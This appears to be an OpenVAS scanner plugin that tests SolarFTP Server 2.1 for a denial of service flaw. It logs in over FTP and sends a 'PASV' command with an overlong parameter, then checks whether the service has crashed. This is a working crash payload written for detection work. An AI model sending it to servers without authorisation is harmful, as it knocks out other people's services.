###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_solar_ftp_pasv_cmd_dos_vuln.nasl 4704 2016-12-07 14:26:08Z cfi $
#
# SolarFTP PASV Command Remote Denial of Service Vulnerability
#
# Authors:
# Veerendra G.G <veernedragg@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802002");
  script_version("$Revision: 4704 $");
  script_tag(name:"last_modification", value:"$Date: 2016-12-07 15:26:08 +0100 (Wed, 07 Dec 2016) $");
  script_tag(name:"creation_date", value:"2011-03-04 14:32:35 +0100 (Fri, 04 Mar 2011)");
  script_tag(name:"cvss_base", value:"8.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:S/C:C/I:C/A:C");
  script_name("SolarFTP PASV Command Remote Denial of Service Vulnerability");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (c) 2011 Greenbone Networks GmbH");
  script_family("FTP");
  script_dependencies("find_service_3digits.nasl");
  script_require_ports("Services/ftp", 21);

  script_xref(name:"URL", value:"http://secunia.com/advisories/42834/");
  script_xref(name:"URL", value:"http://www.johnleitch.net/Vulnerabilities/Solar.FTP.Server.2.1.Buffer.Overflow/77");

  tag_impact = "Successful exploitation will allow attackers to cause a denial
  of service.

  Impact Level: Application";

  tag_affected = "Flexbyte Software Solar FTP Server 2.1, other versions may also
  be affected.";

  tag_insight = "The flaw is due to an error while parsing 'PASV' command, which
  can be exploited to crash the FTP service by sending 'PASV' command with
  an overly long parameter.";

  tag_solution = "No solution or patch was made available for at least one year
  since disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective
  features, remove the product or replace the product by another one.";

  tag_summary = "The host is running SolarFTP Server and is prone to denial of
  service vulnerability.";

  script_tag(name:"impact", value:tag_impact);
  script_tag(name:"affected", value:tag_affected);
  script_tag(name:"insight", value:tag_insight);
  script_tag(name:"solution", value:tag_solution);
  script_tag(name:"summary", value:tag_summary);

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("ftp_func.inc");

ftpPort = get_kb_item("Services/ftp");
if(!ftpPort){
  ftpPort = 21;
}

## check port status
if(!get_port_state(ftpPort)){
  exit(0);
}

## Confirm the Application installed
banner = get_ftp_banner(port:ftpPort);
if("Solar FTP Server" >!< banner){
  exit(0);
}

## Open the socket on port 21. if it fails exit
soc1 = open_sock_tcp(ftpPort);
if(!soc1){
  exit(0);
}

## Check for the default user name
user = get_kb_item("ftp/login");
if(!user){
  user = "anonymous";
}
## check for the default password
pass = get_kb_item("ftp/password");
if(!pass){
  pass = string("anonymous");
}

##  Exit if not able to login
ftplogin = ftp_log_in(socket:soc1, user:user, pass:pass);
if(!ftplogin){
  exit(0);
}

## Send the crafted data
send(socket:soc1, data:string("PASV ", crap(length: 100, data:"A"), '\r\n'));

## Close the socket after sending exploit
close(soc1);

sleep (3);

## Open the socket to confirm FTP server is alive
soc2 = open_sock_tcp(ftpPort);
if(!soc2){
  security_message(ftpPort);
  exit(0);
}

## Receive the data
resp = recv_line(socket:soc2, length:260);

## If response is null then server is crashed
if("Solar FTP Server" >!< resp){
  security_message(ftpPort);
}

ftp_close(socket:soc2);
